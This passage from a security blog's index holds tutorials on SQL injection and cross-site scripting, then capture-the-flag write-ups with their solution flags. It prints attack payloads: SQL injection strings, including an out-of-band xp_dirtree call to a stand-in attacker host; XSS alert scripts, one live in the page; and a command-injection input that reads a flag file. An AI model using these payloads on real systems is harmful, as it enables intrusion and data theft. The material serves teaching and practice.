input:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' OR 1=1 UNION SELECT 1, @@VERSION --</div><p>If the application displays database errors, it might reveal the database version, aiding the attacker.</p><h3 id="Union-based-SQL-Injection"><a href="#Union-based-SQL-Injection" class="headerlink" title="Union-based SQL Injection:"></a>Union-based SQL Injection:</h3><p>Suppose there’s a URL parameter id used in a query like:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">http://example.com/page?id=1 UNION SELECT 1,2,3 --</div><p>If the application concatenates this input into an SQL query without proper validation, it may combine the attacker’s selected columns with the original query’s result.</p><h3 id="Out-of-Band-SQL-Injection"><a href="#Out-of-Band-SQL-Injection" class="headerlink" title="Out-of-Band SQL Injection:"></a>Out-of-Band SQL Injection:</h3><p>If the database server allows outbound connections, an attacker might craft a payload that triggers a DNS lookup or an HTTP request to their controlled server. For example:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">'; EXEC xp_dirtree '\\attacker.com\share\' --</div><p>This could trigger a connection to the attacker’s server, revealing information or performing actions.</p><h3 id="Time-based-SQL-Injection"><a href="#Time-based-SQL-Injection" class="headerlink" title="Time-based SQL Injection:"></a>Time-based SQL Injection:</h3><p>Similar to blind SQL injection, but instead of inferring information from response times, an attacker uses queries that introduce delays. For instance:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(10),0) --</div><p>If the delay occurs, the attacker deduces that the condition was true.</p><h3 id="SQLi-Remediation"><a href="#SQLi-Remediation" class="headerlink" title="SQLi Remediation :"></a>SQLi Remediation :</h3><ul><li><p>Use parameterized queries or prepared statements.</p></li><li><p>Validate and sanitize user inputs.</p></li><li><p>Limit database user privileges.</p></li><li><p>Conduct regular security audits.</p></li><li><p>Implement web application firewalls (WAFs).</p></li><li><p>Educate developers on secure coding.</p></li><li><p>Monitor and log SQL queries.</p></li><li><p>Keep software updated.</p></li></ul><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>SQL injection (SQLi) remains a critical security threat for web applications, allowing attackers to manipulate databases and compromise sensitive data. Understanding the various types of SQL injection attacks, such as classic, blind, and time-based, is crucial for effective mitigation. Implementing remediation strategies like parameterized queries, input validation, and least privilege principles are essential steps towards bolstering application security. By staying vigilant, educating developers, and regularly auditing code for vulnerabilities, organizations can minimize the risk of SQL injection and safeguard their systems from exploitation.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-Site Scripting (XSS)</title>
      <link href="/2024/04/08/XSS/"/>
      <url>/2024/04/08/XSS/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/XSS.jpg" alt="alt text"></p><h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Cross-Site scripting (XSS) is a client-side web vulnerability that allows attackers to inject malicious scripts into web pages.</p><p>This vulnerability is typically caused by a lack of input sanitization&#x2F;validation in web applications</p><p>Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser.</p><p>There are 3 types of Cross-Site Scripting(XSS) attacks :</p><ul><li><p>Reflected XSS</p></li><li><p>Stored XSS</p></li><li><p>DOM-Based XSS</p></li></ul><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>Reflected&#x2F;non-persistent cross-site scripting is the most common form of<br>XSS and involves tricking a victim into clicking a specially crafted link (with an XSS payload) to the vulnerable website.</p><p>When the victim clicks on the link the website includes the XSS payload as part of the response back to the victims browser, where the payload is executed.</p><h3 id="Exemple-of-a-Reflected-XSS-attack"><a href="#Exemple-of-a-Reflected-XSS-attack" class="headerlink" title="Exemple of a Reflected XSS attack:"></a>Exemple of a Reflected XSS attack:</h3><p><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>With this test we can also find out if the Web Application has some kind of filtering or not.</p><p>While this serves as just one among various XSS tests, it remains imperative to conduct thorough assessments for comprehensive security evaluation.</p><h1 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h1><p>Stored&#x2F;persistent cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application’s database or source code via an input that is not sanitised.</p><p>For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitisation  the XSS payload injected in to the webpage will be executed by the browser of anyone that visits that webpage.</p><h3 id="Example-of-a-Stored-XSS-attack"><a href="#Example-of-a-Stored-XSS-attack" class="headerlink" title="Example of a Stored XSS attack:"></a>Example of a Stored XSS attack:</h3><p>Let’s consider a website that allows users to post comments. The website doesn’t properly sanitize user input, so a malicious user could craft a comment containing JavaScript code. For instance:</p><p><code>&lt;script&gt;alert(&#39;Hello, I am a malicious script!&#39;)&lt;/script&gt;</code></p><p><code>If this comment is stored on the server and not properly sanitized, whenever a user visits the page displaying comments, this script will execute in their browser, showing an alert with the message &quot;Hello, I am a malicious script!&quot;. This is a basic example of a Stored XSS attack where the malicious script is stored on the server and executed whenever the compromised page is accessed.</code></p><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h1><p>DOM-Based XSS&#x2F;type-0 XSS is a type of XSS vulnerability that allows an attacker to inject malicious payloads into a webpage by exploiting a weakness in the DOM of the web application.</p><p>A DOM-Based XSS attack involves exploiting a script on the webpage that takes user input and reflects it back to the page without proper sanitisation, the attacker then injects malicious code&#x2F;payloads into the webpage’s DOM by modifying the values of the script’s variables.</p><h3 id="Example-of-a-DOM-Based-XSS-attack"><a href="#Example-of-a-DOM-Based-XSS-attack" class="headerlink" title="Example of a DOM-Based XSS attack:"></a>Example of a DOM-Based XSS attack:</h3><p>Suppose there’s a website with a search feature that dynamically updates the page based on the user’s input without proper sanitization. A malicious user could manipulate the URL parameters like so:</p><p><a href="https://vulnerable-website.com/search?query=%60">https://vulnerable-website.com/search?query=`</a><script>alert('Hello, I am a malicious script!')</script>&#96;</p><p>In this example, the website’s JavaScript code might retrieve the search query from the URL and directly inject it into the page’s DOM without proper sanitization. As a result, the script included in the URL parameter would execute within the context of the page, displaying an alert box with the message <code>Hello, I am a malicious script!</code> (You’ve see it when you clicked on this post :) ).This illustrates how a DOM-based XSS attack can occur entirely on the client-side, manipulating the DOM environment to execute malicious scripts.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>It’s essential for developers and website administrators to implement robust security measures, such as input validation and output encoding, to mitigate the risk of XSS vulnerabilities. By understanding the various forms of XSS attacks and adopting proactive security practices, organizations can better safeguard their web applications and protect users from potential exploitation.</p><hr><h4 id="Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day"><a href="#Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day" class="headerlink" title="Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!"></a>Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!</h4><hr>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Injector</title>
      <link href="/2024/04/07/injector/"/>
      <url>/2024/04/07/injector/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/bannner.png" alt="alt text"></p><p>Challange Link Cyber-EDU:<br><a href="https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu">https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu</a></p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>Browse to the IP Addres Given:</p><p><img src="/../images/injection.png" alt="alt text"></p><p>With the help of google we found a command injection to paste <code>(%20%0Acat%20|/bin/cat%20flag.php)</code> :</p><p><img src="/../images/injection2.png" alt="alt text"></p><p>→ View Page Source → We found the flag:<br><code>C0mm4nd_1nj3c5i0n_1s_E4sy</code></p><p><img src="/../images/flag.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots</title>
      <link href="/2024/04/07/robots/"/>
      <url>/2024/04/07/robots/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/robots.png" alt="alt text"></p><p>Challange Link from Cyber-EDU :<br><a href="https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu">https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu</a></p><h1 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h1><p>Robots.txt is a text file webmasters create to instruct web robots (typically search engine robots) how to crawl pages on their website. The robots.txt file is part of the the robots exclusion protocol (REP), a group of web standards that regulate how robots crawl the web, access and index content, and serve that content up to users. The REP also includes directives like meta robots, as well as page-, subdirectory-, or site-wide instructions for how search engines should treat links (such as “follow” or “nofollow”)c</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>First we paste the address we got in our browser and this is what we get :  </p><p><img src="/../images/image.png" alt="alt text"></p><p>With a tool named <code>nuclei</code> we found a directory <code>robots.txt</code> :</p><p><code>└─$ nuclei -u http://34.159.76.30:31714/ </code>  </p><p>Found:<br><code>[robots-txt-endpoint] [http] [info] http://34.159.76.30:31714/robots.txt</code></p><p>Let’s try to go into <code>/robots.txt</code> :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.25.39.png" alt="alt text"></p><p>We found something interesting &#x2F;g00d_old_mus1c.php , if we dig deep and go into that let’s see what we find :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.45.13.png" alt="alt text"></p><p>And we got the Flag : CTF{Kr4ftw3rk_4nd_th3_r0b0ts}</p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
